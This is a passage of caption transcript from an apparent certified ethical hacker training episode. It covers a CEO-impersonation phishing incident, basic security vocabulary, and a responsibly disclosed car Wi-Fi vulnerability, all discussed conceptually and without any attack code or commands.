them.\n\n342\n00:17:20.200 --> 00:17:24.060\nAnd I think together that combination\nincreases awareness and ultimately makes\n\n343\n00:17:24.060 --> 00:17:27.860\nyou a better, not only security\nprofessional, but a better CEH candidate.\n\n344\n00:17:27.860 --> 00:17:29.660\nSomebody who looks to get certified and\n\n345\n00:17:29.660 --> 00:17:31.940\nultimately wants to become\na certified ethical hacker,\n\n346\n00:17:31.940 --> 00:17:34.370\nthat would be very important for\nyou to consider these things.\n\n347\n00:17:34.370 --> 00:17:35.740\nWhen we think about malware,\n\n348\n00:17:35.740 --> 00:17:38.590\nwhich another great example of\nthings that are trending today.\n\n349\n00:17:38.590 --> 00:17:41.480\nAnd we have to think about what's been\ngoing on in the last couple years\n\n350\n00:17:41.480 --> 00:17:42.365\nwith malware.\n\n351\n00:17:42.365 --> 00:17:47.725\nYet we see an increase and\na focus primarily on targeting,\n\n352\n00:17:47.725 --> 00:17:52.155\nand this is not new, but\ntargeting executives inside of companies.\n\n353\n00:17:52.155 --> 00:17:53.975\nPhishing, in general, is on the rise.\n\n354\n00:17:53.975 --> 00:17:57.335\nSpear phishing and whaling,\nwhich are very targeted phishing attacks,\n\n355\n00:17:57.335 --> 00:17:59.380\nhave been on the rise for several years.\n\n356\n00:17:59.380 --> 00:18:02.410\nSpear fishing, going after\na specific individual, whaling,\n\n357\n00:18:02.410 --> 00:18:06.140\ngoing after senior management,\nC-level executives in a company.\n\n358\n00:18:07.200 --> 00:18:09.330\nCrafting and targeting the attack to them.\n\n359\n00:18:09.330 --> 00:18:13.080\nThere was a recent, I had one of my\ncustomers that I'm doing some work with\n\n360\n00:18:13.080 --> 00:18:14.920\nnow as a matter of fact,\nprobably in the next month or\n\n361\n00:18:14.920 --> 00:18:18.405\nso after we finish up shooting here,\ncuz it may take that long, by the time.\n\n362\n00:18:18.405 --> 00:18:19.240\n>> [LAUGH]\n>> We get done and\n\n363\n00:18:19.240 --> 00:18:20.610\nwe actually get through everything.\n\n364\n00:18:20.610 --> 00:18:23.940\nWe had a challenge getting started first\nthing, but we're rolling along now.\n\n365\n00:18:23.940 --> 00:18:27.070\nBut I have a customer coming up,\nprobably in the next month or so,\n\n366\n00:18:27.070 --> 00:18:30.820\nwe're gonna do a security awareness\nsolution for them and their entire team.\n\n367\n00:18:30.820 --> 00:18:33.890\nThey contacted me, about two, three,\nfour weeks ago, probably, and\n\n368\n00:18:33.890 --> 00:18:36.820\nsaid hey we've got this issue we're\nhoping you could help us out.\n\n369\n00:18:36.820 --> 00:18:40.990\nThe issue is, basically we got\nphished within the last month.\n\n370\n00:18:40.990 --> 00:18:43.440\nAnd the way that this\nphishing attack went down\n\n371\n00:18:43.440 --> 00:18:46.990\nwas that somebody from the outside\nwas able to, essentially,\n\n372\n00:18:46.990 --> 00:18:51.910\nsend an email pro-porting to be from\nthe CEO of the company and send it to\n\n373\n00:18:51.910 --> 00:18:56.600\na variety of people inside the company\nsaying that we were undergoing an audit.\n\n374\n00:18:56.600 --> 00:18:59.890\nAnd we needed everybody to\nsubmit usernames and passwords.\n\n375\n00:18:59.890 --> 00:19:04.230\nBut, also then,\na separate email went to HR and\n\n376\n00:19:04.230 --> 00:19:08.700\nspecifically said we need all\nof the W2 information submitted\n\n377\n00:19:08.700 --> 00:19:12.360\nto me electronically to comply\nwith something that was going on.\n\n378\n00:19:12.360 --> 00:19:17.116\nAnd so one person in HR\nactually sent all the W-2 and\n\n379\n00:19:17.116 --> 00:19:22.030\nW-9 to this, what turned out to\nbe external bad actor who walked\n\n380\n00:19:22.030 --> 00:19:25.810\naway with enough information to assume\nthe identity of anybody in the company.\n\n381\n00:19:25.810 --> 00:19:26.400\n>> Wow.\n\n382\n00:19:26.400 --> 00:19:27.950\n>> Yeah, big wow, right?\n\n383\n00:19:27.950 --> 00:19:32.940\nSo as a result, they spent weeks\ntrying to mitigate that, scrambling,\n\n384\n00:19:32.940 --> 00:19:34.410\ndoing all sorts of stuff.\n\n385\n00:19:34.410 --> 00:19:37.080\nAnd then they finally got\na reactive mode long enough to say,\n\n386\n00:19:37.080 --> 00:19:39.460\nhey you clearly really bad.\n\n387\n00:19:39.460 --> 00:19:41.700\nWe got to figure this out,\nwe can't let this happen again.\n\n388\n00:19:41.700 --> 00:19:45.250\nWe need a have somebody come in,\ntalk to us, figure out what we can do,\n\n389\n00:19:45.250 --> 00:19:49.240\nwound up ultimately talking to us and\nto me, and we've\n\n390\n00:19:49.240 --> 00:19:53.590\nput together a security awareness training\nprogram and a risk assessment seminar for\n\n391\n00:19:53.590 --> 00:19:55.902\nsenior management on top\nof that training program.\n\n392\n00:19:55.902 --> 00:19:58.680\nIt's gonna help them walk through\nwhat they need to do differently but\n\n393\n00:19:58.680 --> 00:20:00.020\nhere is the interesting thing.\n\n394\n00:20:00.020 --> 00:20:01.650\nWhat we found out in interviewing them and\n\n395\n00:20:01.650 --> 00:20:04.230\ntalking with them as we did\ndiscover what we could do.\n\n396\n00:20:04.230 --> 00:20:07.370\nOne of the very first things I asked\nwas okay, tell me what happened,\n\n397\n00:20:07.370 --> 00:20:10.110\ngreat, explain to me the outcomes were,\nokay.\n\n398\n00:20:10.110 --> 00:20:13.530\nUnderstand, a lot of liability there you\nguys are dealing with it by doing this,\n\n399\n00:20:13.530 --> 00:20:14.960\nthis, and this, absolutely.\n\n400\n00:20:14.960 --> 00:20:19.590\nSo after I kinda got the basics\nthe first question I asked was so\n\n401\n00:20:19.590 --> 00:20:24.640\nis there a policy in place at the time\nthe breach occurs that would have\n\n402\n00:20:24.640 --> 00:20:28.740\nmade everybody aware of the fact that\nyou as a company do not under any\n\n403\n00:20:28.740 --> 00:20:31.980\ncircumstances do not ever request\nthis kind of information be sent or\n\n404\n00:20:31.980 --> 00:20:34.530\nbe submitted or be communicated by email.\n\n405\n00:20:34.530 --> 00:20:38.140\nWithout some sort of follow\nup phone call conversations,\n\n406\n00:20:38.140 --> 00:20:41.090\nsomething that forces\nthe user making the request\n\n407\n00:20:41.090 --> 00:20:45.310\nto identify themselves in a way that\nis unique and that can not be spoofed.\n\n408\n00:20:45.310 --> 00:20:47.170\nNo, we had no such policy.\n\n409\n00:20:47.170 --> 00:20:49.350\nOkay, clearly we know why\nthe breach occurred, right?\n\n410\n00:20:49.350 --> 00:20:52.990\nBecause you essentially are taking\nat face value communication that\n\n411\n00:20:52.990 --> 00:20:56.030\ncan obviously be compromised and\nwe know that's the issue.\n\n412\n00:20:56.030 --> 00:21:01.970\nAnd it's amazing how many times we often\nsee in the real world, in the world\n\n413\n00:21:01.970 --> 00:21:06.350\nout there that all of you and you and\nI and Mike and everybody here at ITProTV.\n\n414\n00:21:06.350 --> 00:21:10.400\nOutside of the studio when we're talking\nyou live in as we do this professionally.\n\n415\n00:21:10.400 --> 00:21:15.130\nIt's amazing how many times my customers\nfall part of the exact same thing.\n\n416\n00:21:15.130 --> 00:21:18.180\nHow many times my students as\nI talked to them in classes\n\n417\n00:21:18.180 --> 00:21:19.910\nfall prey the same exact thing.\n\n418\n00:21:19.910 --> 00:21:21.740\nThey've done a lot of the blocking and\ntackling,\n\n419\n00:21:21.740 --> 00:21:27.020\nthe basic conceptual work on the hey we\nhave a system and place to monitor side.\n\n420\n00:21:27.020 --> 00:21:30.590\nThe physical building of\nthe barriers as I often refer to it.\n\n421\n00:21:30.590 --> 00:21:33.300\nThey're good at building\nthe enclave boundaries,\n\n422\n00:21:33.300 --> 00:21:36.740\nthey're good at setting up the physical\nlayers of defense and depth.\n\n423\n00:21:36.740 --> 00:21:38.320\nBecause they understand\nthey need a firewall,\n\n424\n00:21:38.320 --> 00:21:40.310\nthey understand they need\na gateway monitoring device.\n\n425\n00:21:40.310 --> 00:21:44.270\nSo they have those things in place but\nwhat they don't have ultimately\n\n426\n00:21:44.270 --> 00:21:49.170\nis the ability to manage that thought\nprocess and that architecture centrally\n\n427\n00:21:49.170 --> 00:21:52.410\nwith policy and then through\npolicy with process and procedure.\n\n428\n00:21:52.410 --> 00:21:55.020\nDrill down, and\ndelegate responsibility for\n\n429\n00:21:55.020 --> 00:21:57.750\nimplementation through\ncontinuous monitoring.\n\n430\n00:21:57.750 --> 00:22:01.880\nBring GRC, Governance Risk and\nCompliance into the mix\n\n431\n00:22:01.880 --> 00:22:05.515\nin order to be able to understand how to\nvalidate that those things are going on,\n\n432\n00:22:05.515 --> 00:22:07.435\nstandardized and\nthroughout the organization.\n\n433\n00:22:07.435 --> 00:22:12.005\nIn another words, they lack all the levers\nto pull beyond the basic drop and\n\n434\n00:22:12.005 --> 00:22:12.655\nset, right?\n\n435\n00:22:12.655 --> 00:22:14.915\nWe build it, we set it,\nthen we walked away.\n\n436\n00:22:14.915 --> 00:22:16.735\nAnd that's good but that's not enough.\n\n437\n00:22:16.735 --> 00:22:20.197\n20 years ago, ten years ago,\nit was okay to build the boundary,\n\n438\n00:22:20.197 --> 00:22:26.147\nit was okay to man it, or put virtual and\nreal people on it to keep track of it.\n\n439\n00:22:26.147 --> 00:22:28.257\nAnd, to walk away and\nsay, okay, that's enough.\n\n440\n00:22:28.257 --> 00:22:29.497\nIt's not okay anymore.\n\n441\n00:22:29.497 --> 00:22:33.347\nAnd we've seen more and more,\nas time goes by, that that is less and\n\n442\n00:22:33.347 --> 00:22:36.870\nless effective as a security\nsolution in and of itself.\n\n443\n00:22:36.870 --> 00:22:40.640\nUnless it's tied to risk management,\nrisk governance and\n\n444\n00:22:40.640 --> 00:22:44.830\ncompliance thought process that allows\nus to be much broader in our approach.\n\n445\n00:22:44.830 --> 00:22:47.440\nSo we have to think about this and\nreally understand this.\n\n446\n00:22:47.440 --> 00:22:50.380\nI know that we have some terminology\nthat we need to define sir.\n\n447\n00:22:50.380 --> 00:22:52.100\nAnd if we could put Mike so screen up.\n\n448\n00:22:53.320 --> 00:22:54.995\nThere we go look at those pretty words.\n\n449\n00:22:54.995 --> 00:22:56.210\n>> [LAUGH]\n>> Except we're missing the most\n\n450\n00:22:56.210 --> 00:22:57.055\nimportant thing up there.\n\n451\n00:22:57.055 --> 00:22:59.750\n>> Oh-oh.\n>> We have no vocabulary definition so\n\n452\n00:22:59.750 --> 00:23:00.660\nwe've put some out there.\n\n453\n00:23:00.660 --> 00:23:03.640\nSo I'm gonna talk about what these\nterms are we did this on purpose\n\n454\n00:23:03.640 --> 00:23:04.421\nactually for you.\n\n455\n00:23:04.421 --> 00:23:05.221\n>> [LAUGH]\n>> We just wanted to put\n\n456\n00:23:05.221 --> 00:23:08.490\nthe words up I'm gonna walk through them\nright now and give you some definitions.\n\n457\n00:23:08.490 --> 00:23:12.070\nAnd then Mike's gonna post that up after\nthe show and we'll actually have a little\n\n458\n00:23:12.070 --> 00:23:15.480\nrunning vocabulary list for you and\nyou'll be able to keep track of it.\n\n459\n00:23:15.480 --> 00:23:19.180\nOne suggestion, just as a thought process\nfrom studying perspective would be for\n\n460\n00:23:19.180 --> 00:23:22.830\nyou to think about making some flashcards\nor going through these terms and\n\n461\n00:23:22.830 --> 00:23:26.370\nall the other terms will come up against\nat various points in our conversation.\n\n462\n00:23:26.370 --> 00:23:29.120\nCreate a little stack of\nvocabulary flash cards and\n\n463\n00:23:29.120 --> 00:23:32.040\ndoing some minor review\nwith regards to studying.\n\n464\n00:23:32.040 --> 00:23:37.062\nIt's always important, always good,\nto have a sense of this vocabulary.\n\n465\n00:23:37.062 --> 00:23:40.404\nAnd to be able to have maybe one\nsentence definition kind of working\n\n466\n00:23:40.404 --> 00:23:43.327\nin your mind if you're asked\nabout how to define the term or\n\n467\n00:23:43.327 --> 00:23:46.310\npotentially how to apply\nthat knowledge on the exam.\n\n468\n00:23:46.310 --> 00:23:49.361\nRemember we may just simply see,\nhey what is the definition of this\n\n469\n00:23:49.361 --> 00:23:51.880\nterm question and\nyou have to To pull the right answer.\n\n470\n00:23:51.880 --> 00:23:56.390\nComplicated but not overly complicated if\nyou study but what would be more complex\n\n471\n00:23:56.390 --> 00:24:00.110\nwould be we see these term used today\nin a some sort of a word problem or\n\n472\n00:24:00.110 --> 00:24:04.880\na scenario any way to understand the value\nof that term an then apply the knowledge.\n\n473\n00:24:04.880 --> 00:24:07.110\nSo wanna make sure we have a sense\non how to do that either way.\n\n474\n00:24:07.110 --> 00:24:09.531\nSo let's talk about hack value.\n\n475\n00:24:09.531 --> 00:24:13.460\nA hack value is essentially\nthat something has worth.\n\n476\n00:24:13.460 --> 00:24:16.440\nOr among hackers that something\nis worth going after.\n\n477\n00:24:16.440 --> 00:24:18.860\nSo it's the idea that\na hacker in their mind,\n\n478\n00:24:18.860 --> 00:24:22.640\nsees an objective as being worth\nwhile to go after and attack.\n\n479\n00:24:22.640 --> 00:24:24.920\nSo we may say if we're working for\n\n480\n00:24:24.920 --> 00:24:28.170\nlet's say company Y,\nthat are intellectual property.\n\n481\n00:24:28.170 --> 00:24:31.800\nOur unique information that\nmakes us the top of our\n\n482\n00:24:31.800 --> 00:24:34.700\nparticular industry with\nregards to what we do would\n\n483\n00:24:34.700 --> 00:24:37.960\nhave hack value because a hacker may\nwanna come after it and steal that.\n\n484\n00:24:37.960 --> 00:24:41.040\nMaybe somebody's gonna pay them or\nthey feel they can take it and\n\n485\n00:24:41.040 --> 00:24:43.510\ngo make money with it by trying\nto sell it to our competitor.\n\n486\n00:24:43.510 --> 00:24:44.960\nWhatever that may be.\n\n487\n00:24:44.960 --> 00:24:48.280\nSo it's the value that the hacker or\nthe bad actor perceives\n\n488\n00:24:48.280 --> 00:24:51.760\nin the particular item, or issue,\nor thing that they wanna do.\n\n489\n00:24:51.760 --> 00:24:53.850\nThat is what we define as hack value.\n\n490\n00:24:53.850 --> 00:24:55.240\nVulnerability, next one down.\n\n491\n00:24:56.620 --> 00:25:00.672\nThe classic definition of a vulnerability\nis the existence of a weakness.\n\n492\n00:25:00.672 --> 00:25:04.980\nJust generically, the idea that there's\nsome sort of weakness in a system.\n\n493\n00:25:04.980 --> 00:25:10.410\nWe can think of vulnerabilities as\nbeing weaknesses in architecture and\n\n494\n00:25:10.410 --> 00:25:14.605\ndesign and implementation and\nmanagement and any area in other words.\n\n495\n00:25:14.605 --> 00:25:19.695\nBut very simply, very easily the existence\nof a weakness is what we would think of.\n\n496\n00:25:19.695 --> 00:25:23.330\nYeah, I can expose it, like I feel that,\n[CROSSTALK] the first time actually.\n\n497\n00:25:23.330 --> 00:25:24.151\n>> [LAUGH]\n>> So\n\n498\n00:25:24.151 --> 00:25:27.335\nyou will be think of the existence of\na weaknesses that's why I have Mike\n\n499\n00:25:27.335 --> 00:25:30.412\ntype by the way, cuz if you saw my typing,\nwe'd be here forever.\n\n500\n00:25:30.412 --> 00:25:34.053\nYou would not be able to read anything and\nnothing would make sense.\n\n501\n00:25:34.053 --> 00:25:37.669\nSo just make sure you know that\nthe existence of a weakness generically is\n\n502\n00:25:37.669 --> 00:25:39.862\nhigh we define a vulnerability.\n\n503\n00:25:39.862 --> 00:25:41.496\nExploit, next one down.\n\n504\n00:25:41.496 --> 00:25:46.034\nThe exploit is the concept of a breach of\na system of some kind whatever it maybe,\n\n505\n00:25:46.034 --> 00:25:49.220\nso breaching a target system\nthrough a vulnerability so\n\n506\n00:25:49.220 --> 00:25:52.751\nit's not just enough to say\nhe will breach that system.\n\n507\n00:25:52.751 --> 00:25:55.420\nBreach being a fancy term for\ngetting into it.\n\n508\n00:25:55.420 --> 00:25:58.910\nWe hacked into it but we have to\nreally say not only breached it but\n\n509\n00:25:58.910 --> 00:26:02.000\nwe breached it because we took\nadvantage of the vulnerability.\n\n510\n00:26:02.000 --> 00:26:03.620\nWe found the weakness and\n\n511\n00:26:03.620 --> 00:26:06.538\nwith that we were able to use that\nweakness to get in to the system.\n\n512\n00:26:06.538 --> 00:26:09.770\nThat's why we wanna make sure\nwe make the connection up there.\n\n513\n00:26:09.770 --> 00:26:14.668\nPayload, when we think about payload,\nwe can be thinking about some sort\n\n514\n00:26:14.668 --> 00:26:19.645\nof software or a malware, or some sort\nof exploit code because we're gonna\n\n515\n00:26:19.645 --> 00:26:23.920\nbe thinking about some sort of\nsystem that delivers something.\n\n516\n00:26:23.920 --> 00:26:26.790\nThat's the payload of the thing being\ndelivered, and so traditionally\n\n517\n00:26:26.790 --> 00:26:31.920\nit's software and malware that delivers in\nthis case an exploit, more often than not.\n\n518\n00:26:31.920 --> 00:26:35.180\nSo the exploit code that is being\ndelivered is typically referred\n\n519\n00:26:35.180 --> 00:26:38.764\nto as the payload,\nnot the expludes, but the exploits.\n\n520\n00:26:38.764 --> 00:26:41.301\n>> [LAUGH]\n>> So the exploit of some kind.\n\n521\n00:26:41.301 --> 00:26:43.010\nSo that's our payload.\n\n522\n00:26:43.010 --> 00:26:46.920\nWe often hear that referred to with\nregards to as we said malware or\n\n523\n00:26:46.920 --> 00:26:51.090\nviruses or Trojans, if you can\nthink of any of those categories,\n\n524\n00:26:51.090 --> 00:26:52.300\nthings that we talk about.\n\n525\n00:26:52.300 --> 00:26:55.530\nThose are all considered to be\nthe payloads, when we attack something.\n\n526\n00:26:55.530 --> 00:26:59.070\nZero-day attack,\nthis is going to be an attack or\n\n527\n00:26:59.070 --> 00:27:01.770\nsometimes referred to also\nas a zero day exploit.\n\n528\n00:27:01.770 --> 00:27:03.320\nEssentially the same thing.\n\n529\n00:27:03.320 --> 00:27:07.489\nThis is going to exploit a computer\napplication vulnerability or\n\n530\n00:27:07.489 --> 00:27:09.773\nagain some sort of vulnerability.\n\n531\n00:27:09.773 --> 00:27:13.772\nAnd it is going to take advantage of\nthat vulnerability but it does so\n\n532\n00:27:13.772 --> 00:27:16.649\nreally without the well\npublicized knowledge of\n\n533\n00:27:16.649 --> 00:27:20.030\nthat vulnerability being\nmade available to everybody.\n\n534\n00:27:20.030 --> 00:27:25.260\nSo a lot of times we hear\nabout the fact that this or\n\n535\n00:27:25.260 --> 00:27:31.340\nthat software security researcher has\nfound this problem or this issue and\n\n536\n00:27:31.340 --> 00:27:35.540\nthey waited so many days to tell everybody\nabout it, and they went to the company and\n\n537\n00:27:35.540 --> 00:27:39.620\nsaid, hey, this is an issue and\nyou should take this seriously.\n\n538\n00:27:39.620 --> 00:27:41.830\nI'm gonna share a story with\nyou about this right now.\n\n539\n00:27:41.830 --> 00:27:45.570\nAnd if somebody attacks and\nfinds that vulnerability, and exploits it,\n\n540\n00:27:45.570 --> 00:27:49.570\nbefore we essentially expose, report it,\nand put a patch out, we would call it\n\n541\n00:27:49.570 --> 00:27:53.030\na zero-day exploit, or a zero-day attack,\nor a zero-day vulnerability.\n\n542\n00:27:53.030 --> 00:27:55.750\nSo interesting, last week, again,\nripped right from the headlines.\n\n543\n00:27:55.750 --> 00:27:57.820\nSo I couldn't make this\nstuff up if I tried.\n\n544\n00:27:57.820 --> 00:28:02.770\nI don't know how many of you have\na Mitsubishi as a car, if you do, good for\n\n545\n00:28:02.770 --> 00:28:05.410\nyou, you may wanna think about\nchanging it out and here's why.\n\n546\n00:28:05.410 --> 00:28:07.660\nSo makes the headlines last week,\n\n547\n00:28:07.660 --> 00:28:11.090\nI'm actually in the middle of doing\nsome cloud security work and so\n\n548\n00:28:11.090 --> 00:28:13.480\nI'm talking to some of my customers\nabout cloud security last week.\n\n549\n00:28:13.480 --> 00:28:16.390\nAnd I'm reading some headlines before\nI go into a meeting with them.\n\n550\n00:28:16.390 --> 00:28:19.700\nAnd sure enough,\nI see an article on the latest Mitsubishi,\n\n551\n00:28:19.700 --> 00:28:23.650\nit was one of their SUVs, it wasn't the,\nI forget what it was specifically,\n\n552\n00:28:23.650 --> 00:28:25.450\nwhatever they call their big SUV.\n\n553\n00:28:25.450 --> 00:28:30.041\nThey put out a 2017, so the brand new car\nyear model coming out early this year for\n\n554\n00:28:30.041 --> 00:28:30.696\n2017.\n\n555\n00:28:30.696 --> 00:28:31.670\nThey previewed it.\n\n556\n00:28:31.670 --> 00:28:33.170\nThey put it out.\n\n557\n00:28:33.170 --> 00:28:37.547\nWithin a few weeks, a British research\nsecurity company goes out and\n\n558\n00:28:37.547 --> 00:28:41.018\nbuys one to do research on it,\nand within about a week,\n\n559\n00:28:41.018 --> 00:28:45.699\nthey find that the way that this\nparticular manufacturer, Mitsubishi,\n\n560\n00:28:45.699 --> 00:28:49.421\nhad implemented the use of\nwireless on board technology.\n\n561\n00:28:49.421 --> 00:28:52.684\nCuz now almost every cars coming\nwith enabled wireless on board,\n\n562\n00:28:52.684 --> 00:28:56.358\nthe way they implemented it and used that\nwith the app to be able to remote to\n\n563\n00:28:56.358 --> 00:29:00.241\ncontrol the car was a little bit different\nthat what everybody else is doing.\n\n564\n00:29:00.241 --> 00:29:02.262\nMost of the big vendors have done this but\n\n565\n00:29:02.262 --> 00:29:05.294\nthey're running that connection\nthrough a secure cloud and\n\n566\n00:29:05.294 --> 00:29:09.496\nyou have to log into a vendor control\nwebsite, multifactor authentication.\n\n567\n00:29:09.496 --> 00:29:13.600\nAnd then, they find the PID or\nthe ID for the car, and\n\n568\n00:29:13.600 --> 00:29:14.730\nthen they connect you essentially.\n\n569\n00:29:14.730 --> 00:29:18.740\nIt's like a secure RDP tunnel or\nsession into the car, but\n\n570\n00:29:18.740 --> 00:29:19.810\nthrough a secure website.\n\n571\n00:29:19.810 --> 00:29:21.800\nThat's the way most vendors\nare implementing it.\n\n572\n00:29:21.800 --> 00:29:24.470\nThere are challenges with that\nthat could be hacked as well.\n\n573\n00:29:24.470 --> 00:29:26.400\nBut Mitsubishi went a different process.\n\n574\n00:29:26.400 --> 00:29:28.148\nThey're using near field Wi-Fi.\n\n575\n00:29:28.148 --> 00:29:32.080\nSo essentially, you've got to be within\nabout 30 feet of the car with the phone or\n\n576\n00:29:32.080 --> 00:29:34.485\nthe app for\nit to be able to activate and work.\n\n577\n00:29:34.485 --> 00:29:35.820\nYou're not going through the cloud and\n\n578\n00:29:35.820 --> 00:29:38.602\nthis is not something that you can do\nremotely from a million miles away.\n\n579\n00:29:38.602 --> 00:29:42.363\nWhich itself,\nI don't know what people are thinking.\n\n580\n00:29:42.363 --> 00:29:44.020\n>> [LAUGH]\n>> If I'm within 30 feet,\n\n581\n00:29:44.020 --> 00:29:47.030\nI don't need you to give me an app to\nbe able to, it doesn't make sense.\n\n582\n00:29:47.030 --> 00:29:51.930\nBut anyway, point is you gonna be close\nto the car but what they found was that,\n\n583\n00:29:51.930 --> 00:29:55.690\nbecause the way it's being\nimplemented that it was hackable.\n\n584\n00:29:55.690 --> 00:29:57.390\nAnd they had not implemented,\n\n585\n00:29:57.390 --> 00:30:00.720\nsame old story we'll talk about it in one\nof the upcoming episodes with wireless and\n\n586\n00:30:00.720 --> 00:30:04.110\nhacking, the guards to not that they used\nWEP, because that really would have been\n\n587\n00:30:04.110 --> 00:30:08.570\ntragically funny, but how not to\nbuild a secure car in ten steps.\n\n588\n00:30:08.570 --> 00:30:12.500\nBut they did essentially implement a newer\nversion of a wireless security protocol,\n\n589\n00:30:12.500 --> 00:30:15.190\nbut basically blew the architecture and\nthe implementation.\n\n590\n00:30:15.190 --> 00:30:16.420\nThey didn't do it correctly.\n\n591\n00:30:16.420 --> 00:30:20.040\nSame kind of issues and concerns we\nhave if we historically go back and\n\n592\n00:30:20.040 --> 00:30:21.890\nlook at what went on with WEP.\n\n593\n00:30:21.890 --> 00:30:24.300\nIf you know anything about that,\nyou'll know what I'm talking about.\n\n594\n00:30:24.300 --> 00:30:26.870\nIf you don't, tune into\nthe upcoming episodes about that.\n\n595\n00:30:26.870 --> 00:30:30.310\nWe'll quickly go through that history and\ntalk about what went wrong and how you do\n\n596\n00:30:30.310 --> 00:30:33.890\nit the right way as part of discussing\nhow to hack in the wireless world.\n\n597\n00:30:33.890 --> 00:30:37.530\nBut essentially they made very similar\nmistakes and then on top of it they\n\n598\n00:30:37.530 --> 00:30:42.285\ncompounded that by not having anybody\nfrom a security background to go and\n\n599\n00:30:42.285 --> 00:30:45.125\nreview what they had done\nto implement the system.\n\n600\n00:30:45.125 --> 00:30:49.195\nAnd so, they put it out there, didn't test\nit, and the security firm figured out that\n\n601\n00:30:49.195 --> 00:30:51.555\nthere were all these\nweaknesses went to the vendor.\n\n602\n00:30:51.555 --> 00:30:54.285\nMitsubishi is a Japanese car manufacturer.\n\n603\n00:30:54.285 --> 00:30:57.255\nWent to the vendor in Japan and\nsaid, essentially, hey,\n\n604\n00:30:57.255 --> 00:31:01.430\nwe found all this concern and issues,\nyou should take a look at this.\n\n605\n00:31:01.430 --> 00:31:04.820\nMitsubishi just blew them off and said,\nwe're not interested, we don't care.\n\n606\n00:31:04.820 --> 00:31:09.320\nThey waited, they tried several times,\nthey couldn't get through to Mitsubishi,\n\n607\n00:31:09.320 --> 00:31:10.952\nmake them see the light of day.\n\n608\n00:31:10.952 --> 00:31:14.961\nAnd this is the ongoing struggle in our\ncommunity, researchers find this stuff and\n\n609\n00:31:14.961 --> 00:31:17.022\nthere's this argument about the moral and\n\n610\n00:31:17.022 --> 00:31:21.030\nethical dilemmas associated with\nessentially outing this kind of weakness.\n\n611\n00:31:21.030 --> 00:31:22.960\nBecause they went to the vendor,\ndid all the right things.\n\n612\n00:31:22.960 --> 00:31:24.550\nThe vendor did not take them on.\n\n613\n00:31:24.550 --> 00:31:27.170\nFinally, they published\na paper about this concern and\n\n614\n00:31:27.170 --> 00:31:30.400\nsaid essentially we're going to expose it,\nthe vendor had the chance.\n\n615\n00:31:30.400 --> 00:31:33.870\nThe minute the did that, Mitsubishi\ngot on the phone and was like, my god,\n\n616\n00:31:33.870 --> 00:31:35.080\nwhy didn't you come to us?\n\n617\n00:31:35.080 --> 00:31:36.330\n>> How could you do this to us?\n\n618\n00:31:36.330 --> 00:31:38.102\n>> And listen, they're a big company.\n\n619\n00:31:38.102 --> 00:31:38.880\nI get it.\n\n620\n00:31:38.880 --> 00:31:40.287\nMaybe they weren't talking\nto the right people.\n\n621\n00:31:40.287 --> 00:31:41.597\nI'm not suggesting for a minute,\n\n622\n00:31:41.597 --> 00:31:43.760\nMitsubishi wouldn't take\nthis stuff seriously.\n\n623\n00:31:43.760 --> 00:31:46.117\nSince that's become public knowledge\nthey've been very proactive at trying\n\n624\n00:31:46.117 --> 00:31:46.623\nto deal with it.\n\n625\n00:31:46.623 --> 00:31:49.815\nMaybe, it just the message wasn't getting\nthrough, and those things happen.\n\n626\n00:31:49.815 --> 00:31:51.830\nI mean, that's just the way things are.\n\n627\n00:31:51.830 --> 00:31:53.640\nBut reality is,\n\n628\n00:31:53.640 --> 00:31:57.350\nwe think about something like zero day\nattack, this was pretty significant.\n\n629\n00:31:57.350 --> 00:32:00.260\nThey were able to get into\nthe on-board control systems,\n\n630\n00:32:00.260 --> 00:32:03.070\nsend kinda flaws that\nthe Tesla Model S had.\n\n631\n00:32:03.070 --> 00:32:06.990\nThis past year when they came out,\nwhere, essentially, it was shown that\n\n632\n00:32:06.990 --> 00:32:10.390\nyou can hack in, and Tesla's actually\ngone in a very interesting way in this.\n\n633\n00:32:10.390 --> 00:32:13.750\nThey're the first company, first car\ncompany, in particular, but one of\n\n634\n00:32:13.750 --> 00:32:17.680\nthe very first companies overall that has\nnot only web enabled their product, but\n\n635\n00:32:17.680 --> 00:32:23.120\ndone so with the express, declared\nstrategic intention of doing over the wire\n\n636\n00:32:23.120 --> 00:32:27.590\nupdates to firmware and instructional\npatches to the system to be able\n\n637\n00:32:27.590 --> 00:32:31.120\nto operate it, and committed that, that's\nhow their gonna do their update cycles for\n\n638\n00:32:31.120 --> 00:32:33.190\ntheir software for\nthe on-board controllers.\n\n639\n00:32:33.190 --> 00:32:36.050\nVery interesting, very innovative,\nbut they had some issues,\n\n640\n00:32:36.050 --> 00:32:40.360\nthey tried to correct them and good for\nthem and that's great, but again,\n\n641\n00:32:40.360 --> 00:32:43.500\ngotta think about what's going on and\nyour putting your system, in this case,\n\n642\n00:32:43.500 --> 00:32:48.430\nsomething that goes down the road at\nmaybe 100 miles an hour or more, right?\n\n643\n00:32:48.430 --> 00:32:50.270\nInto the hands, essentially,\n\n644\n00:32:50.270 --> 00:32:53.250\nof a bad actor who may take it away\nfrom you while you're driving.\n\n645\n00:32:53.250 --> 00:32:56.330\nI wanna be clear,\nI'm not suggesting that that will happen,\n\n646\n00:32:56.330 --> 00:32:58.910\nI'm not suggesting that it\ncould happen right now,\n\n647\n00:32:58.910 --> 00:33:01.770\nI'm not suggesting any of you\nare in any way in danger.\n\n648\n00:33:01.770 --> 00:33:03.520\nI don't want anybody to panic about this,\n\n649\n00:33:03.520 --> 00:33:05.410\nif you're not familiar\nwith what's going on.\n\n650\n00:33:05.410 --> 00:33:08.640\nBut I want you to understand that\nthere is potential liability there.\n\n651\n00:33:08.640 --> 00:33:10.620\nIt's been shown time and again,\n\n652\n00:33:10.620 --> 00:33:15.720\nthe last couple of years that almost every\nmajor car manufacturer has vulnerabilities\n\n653\n00:33:15.720 --> 00:33:19.780\nin these implementations that under\ncertain conditions can be compromised.\n\n654\n00:33:19.780 --> 00:33:22.860\nAnd there is that possibility that\nsomebody may take advantage of\n\n655\n00:33:22.860 --> 00:33:23.850\nthese systems.\n\n656\n00:33:23.850 --> 00:33:25.440\nSo, we have to understand that.\n\n657\n00:33:25.440 --> 00:33:28.800\nThere was an issue a couple of years back,\nI talk about this in my CISSP.\n\n658\n00:33:28.800 --> 00:33:30.450\nConversations with you, that Mike and\n\n659\n00:33:30.450 --> 00:33:34.500\nI did, some of the other classes\nthat I've done on IT Pro TV and\n\n660\n00:33:34.500 --> 00:33:37.870\nsome of the other areas with\nregards to security certifications.\n\n661\n00:33:37.870 --> 00:33:41.178\nI think, in the cast the cast,\nwe mentioned this as well.\n\n662\n00:33:41.178 --> 00:33:45.039\nWe talked about the fact that there's an\nissue in the avionics industry with 